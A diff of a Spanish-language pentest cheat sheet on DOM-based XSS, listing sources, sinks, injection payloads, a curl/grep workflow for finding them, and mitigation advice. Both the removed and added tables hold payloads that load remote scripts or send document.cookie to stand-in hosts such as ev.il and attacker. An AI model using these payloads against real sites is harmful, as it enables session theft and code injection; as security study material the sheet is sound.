@@ -1,59 +1,102 @@
 ---
 aliases:
-  - "XSS Basado en DOM"
+  - XSS Basado en DOM
 tags:
   - type/technique
   - vuln/xss
   - technique/execution
   - asset/web-app
-primary categories:
-secondary categories:
-tertiary categories:
+primary categories: null
+secondary categories: null
+tertiary categories: null
 kind: SubCheatSheet
 linked:
-  - "[[Cross-Site Scripting (XSS)]]"
+  - '[[Cross-Site Scripting (XSS)]]'
 ---
 # XSS - Manipulación de Sources y Sinks (DOM-based)
 
 ***
 
 ## Cheatsheet
-|     **Categoría**      |             **Source / Sink**              |                                     **Payload de Ejemplo**                                      |                                                                            **Escenario de Explotación y Contexto**                                                                            |
-| :--------------------: | :----------------------------------------: | :---------------------------------------------------------------------------------------------: | :-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------: |
-|   <br><br>**Source**   |          <br><br>`location.hash`           |           <br><pre><code>`#<svg/onload=import('//malicioso.net/x.js')>`</code></pre>            |   <br>Se explota cuando el frontend (ej. frameworks SPA) renderiza el fragmento dinámicamente sin validación. Al no enviarse al servidor web, evade auditorías de WAF perimetrales.<br><br>   |
-| <br><br><br>**Source** |       <br><br><br>`location.search`        |   <br><pre><code>`?redirect=javascript:fetch('//ev.il/?c='+document.cookie)`</code></pre><br>   |                   <br><br>Ideal para vulnerabilidades de redirección abierta en el cliente (ej. cuando la app hace `window.location = urlParams.get('redirect')`).<br><br>                    |
-| <br><br><br>**Source** |         <br><br><br>`window.name`          | <br><pre><code>`window.name="eval(atob('...'))"; location='http://target.com'`</code></pre><br> |       <br><br>Permite inyectar payloads masivos (hasta 2MB) de forma silenciosa. El atacante setea la variable en su dominio y redirige a la víctima hacia el Sink vulnerable.<br><br>        |
-|   <br><br>**Source**   |        <br><br>`document.referrer`         |              <br><br>Originado desde un sitio atacante con URL maliciosa.<br><br>               |         <br>Explotado cuando la página vulnerable construye enlaces dinámicos (ej. un botón de "Volver atrás") inyectando esta propiedad directamente en un atributo `href`.<br><br>          |
-|    <br><br>**Sink**    | <br><br>`innerHTML` / `insertAdjacentHTML` |                   <br><pre><code>`<style onload=eval(name)>`</code></pre><br>                   |  <br>Bypass de filtros básicos que bloquean etiquetas `<script>`. Al combinar la inyección con el Source `window.name`, se logra ejecución limpia sin saturar la URL con el payload.<br><br>  |
-|    <br><br>**Sink**    |      <br><br>`eval()` / `Function()`       |        <br><pre><code>`\'-alert(1)//` o `");import('//ev.il/x.js');//`</code></pre><br>         | <br>Escape de contexto dentro de bloques preexistentes. Si el input se concatena (ej. `eval("var usr = '"+input+"';")`), el payload rompe la asignación original y ejecuta el código.<br><br> |
-|    <br><br>**Sink**    |  <br><br>`setTimeout()` / `setInterval()`  |                <br><pre><code>`1000); fetch('//ev.il/'+cookie); //`</code></pre>                | <br>Ocurre cuando se pasa una cadena en lugar de un _callback_ (ej. `setTimeout("log('"+input+"')", 1000)`). El payload cierra la función original y encadena la ejecución maliciosa.<br><br> |
-|    <br><br>**Sink**    |         <br><br>`document.write()`         |               <br><br>`</script><script src="//ev.il/hook.js"></script>`<br><br>                | <br>Típico en integraciones legacy o Ad-Tech. Se requiere cerrar explícitamente el contexto del `<script>` actual para que el motor del navegador parsee e incruste el script remoto.<br><br> |
+
+| **Payload** | **Qué obtenés** | **Cuándo** |
+|:---:|:---:|:---:|
+| `https://target/#<img src=x onerror=alert(1)>` | Fragment inyectado en `location.hash` → sink `innerHTML` | App lee `location.hash` y la renderiza con `.innerHTML`. |
+| `https://target/?q=<svg onload=alert(1)>` | Search param leído por JS y volcado a innerHTML | Source = `location.search`, sink = `innerHTML`. |
+| `https://target/#javascript:fetch('//attacker/?c='+document.cookie)` | XSS+exfil via fragment | App hace `window.location = location.hash`. |
+| `<a href="https://target/#payload">click</a>` (en sitio atacante) | Setea `document.referrer` cuando víctima clickea | Sink lee referrer → innerHTML. |
+| `window.name="alert(1)"; location='https://target/#sink'` | Payload masivo (≤2MB) en `window.name` cross-domain | Sink hace `eval(window.name)`. |
+| `'-alert(1)-'` | Rompe string JS dentro de `eval('var u="'+input+'"')` | Sink `eval()` con concat de input. |
+| `");alert(1);//` | Rompe sub-shell de `eval`/`Function` | Sink ejecuta string concatenado. |
+| `1);alert(1);(1` | Rompe `setTimeout("log('"+input+"')", 1000)` | Sink `setTimeout` con string. |
+| `</script><script>alert(1)</script>` | Rompe contexto `document.write` actual | Sink `document.write(input)`. |
+| `<style onload=eval(name)>` | Style con onload + payload en `window.name` | Sink `innerHTML` con `<script>` bloqueado. |
 ^xss-sources
 
-### Flujo de Ejecución y Trazado de Variables
+### Sources controlables (lee atacante)
 
-Para que la manipulación directa sea exitosa, debo rastrear el flujo de datos dentro de los scripts de la página. El ataque requiere conectar un Source con un Sink sin que exista una validación, sanitización o codificación intermedia adecuada.
+| **Source** | **Cómo lo controlás** | **Notas** |
+|:---:|:---:|:---:|
+| `location.hash` | Fragment `#...` — NO se envía al server, evade WAF | Más usado. |
+| `location.search` | Query string `?...` | Visible al server. |
+| `location.pathname` | Path `/foo/bar` | Limitado por router. |
+| `document.referrer` | URL del sitio que linkea | Requiere control de sitio que linkea. |
+| `window.name` | Setea en tu sitio antes de redirigir | Sobrevive cross-domain. 2MB max. |
+| `document.cookie` | Si podés setear cookie (subdomain takeover, prev XSS) | Persistente. |
+| `localStorage` / `sessionStorage` | Si lograste write previo | Persistente. |
+| `postMessage` | `targetWindow.postMessage(payload, '*')` | Cross-frame messaging. |
+^xss-sources-sources
 
-- **Identificación del Source:** Consiste en localizar dónde la aplicación lee entradas de mi control directo. Por ejemplo, analizando el script para encontrar asignaciones como `var payload = window.location.hash.substring(1);`.
-    
-- **Confirmación del Sink:** Rastrear el uso de esa variable para ubicar el punto exacto donde se emplea en funciones críticas de renderizado o ejecución. Ejemplo: `document.getElementById("mensaje").innerHTML = payload;`.
-    
-- **Adaptación del Payload:** La naturaleza de la inyección depende estrictamente del Sink. Si el Sink procesa HTML (como `innerHTML`), inyecto etiquetas con manejadores de eventos, por ejemplo: `<img src=x onerror=alert(1)>`. Si el Sink espera y ejecuta JavaScript puro (como `eval()`), mi payload no necesita etiquetas, inyecto la sintaxis directa: `alert(1);`.
-    
+### Sinks vulnerables (escribe app)
 
-### Remediación y Sustitución de APIs
+| **Sink** | **Qué hace** | **Payload type** |
+|:---:|:---:|:---:|
+| `element.innerHTML = x` | Parsea HTML, ejecuta `<img onerror>` etc | HTML payload. |
+| `element.outerHTML = x` | Idem innerHTML | HTML payload. |
+| `document.write(x)` | Inyecta HTML directo | HTML payload — `<script>` ejecuta. |
+| `eval(x)` | Ejecuta JS | JS code. |
+| `Function(x)()` | Constructor + invoke | JS code. |
+| `setTimeout(x, n)` / `setInterval(x, n)` | Si `x` es string, eval JS | JS code. |
+| `element.src = x` (script/iframe) | Carga URL como código/HTML | `javascript:`/`data:` URI. |
+| `element.href = x` (anchor) | Click ejecuta | `javascript:` URI. |
+| `location = x` / `location.href = x` | Navega a URL | `javascript:` URI. |
+| `Range.createContextualFragment(x)` | Parsea HTML | HTML payload. |
+| `jQuery $(x)` | Si `x` empieza con `<`, parsea HTML | HTML payload. |
+^xss-sources-sinks
 
-La mitigación del DOM XSS no se soluciona filtrando entradas en el servidor, sino adoptando prácticas de desarrollo defensivo en el frontend, alterando la forma en que el JavaScript manipula el DOM:
+### Workflow
 
-- **Implementación de Sinks Seguros:** Sustituir las asignaciones peligrosas como `innerHTML` o `outerHTML` por propiedades que interpretan el contenido estrictamente como texto sin formato, tales como `textContent` o `innerText`.
-    
-- **Eliminación de Ejecución Dinámica:** Suprimir el uso de funciones de evaluación en tiempo real (`eval()`, `Function()`, `setTimeout()` con parámetros de cadena) siempre que los datos provengan directa o indirectamente de la interacción del usuario.
+```bash
+# 1. Identificar source — grep el JS de la app
+curl -s https://target/static/app.js | grep -E 'location\.(hash|search)|document\.(referrer|cookie)|window\.name'
 
+# 2. Trazar el flow del input — DevTools → Sources tab → search variable name
+# Setear breakpoint en cada uso
+
+# 3. Identificar sink
+grep -E 'innerHTML|document\.write|eval\(|setTimeout\(.*[\'"]|Function\(' app.js
+
+# 4. Construir payload según sink
+# Si innerHTML → HTML/event handler
+# Si eval/setTimeout-string → JS directo
+
+# 5. Triggerear via source
+# Hash: enviar link https://target/#payload
+# Referrer: hostear página que linkea con payload en URL
+# window.name: redirigir desde tu sitio con window.name seteado
+
+# 6. DOM Invader (Burp Pro) — auto-detect sources/sinks
+# Burp → Extender → DOM Invader → habilitar
+```
 
 ___
 
 ## Overview
 
-A diferencia de las variantes reflejadas y almacenadas, el [[XSS Basado en DOM]] (DOM XSS) ocurre enteramente en el lado del cliente (en el navegador). La vulnerabilidad no reside en cómo el servidor web procesa y devuelve el HTML, sino en cómo el código [[JavaScript]] legítimo de la aplicación recoge datos de una fuente controlable (Source) y los transfiere a una función o propiedad que ejecuta o renderiza ese contenido de forma insegura (Sink).
+**DOM XSS** = source (input atacante) → JS legítimo de la app → sink (función que ejecuta/renderiza) **todo en cliente**. No pasa por server → invisible para WAFs perimetrales y access logs.
 
-Esta característica arquitectónica hace que muchos ataques DOM XSS sean invisibles para los [[Web Application Firewall]] (WAF) tradicionales y para los registros de acceso del servidor, ya que el payload puro nunca abandona el entorno local de la víctima.
+**Identificación:** trazar de Source a Sink en el JS de la app. Tools: DOM Invader (Burp), grep manual, DevTools breakpoints.
+
+**Mitigación:** sustituir `innerHTML`→`textContent`, eliminar `eval`/`Function`/`setTimeout`-string, validar/sanitizar en el flow source→sink, Trusted Types API.
+
+***
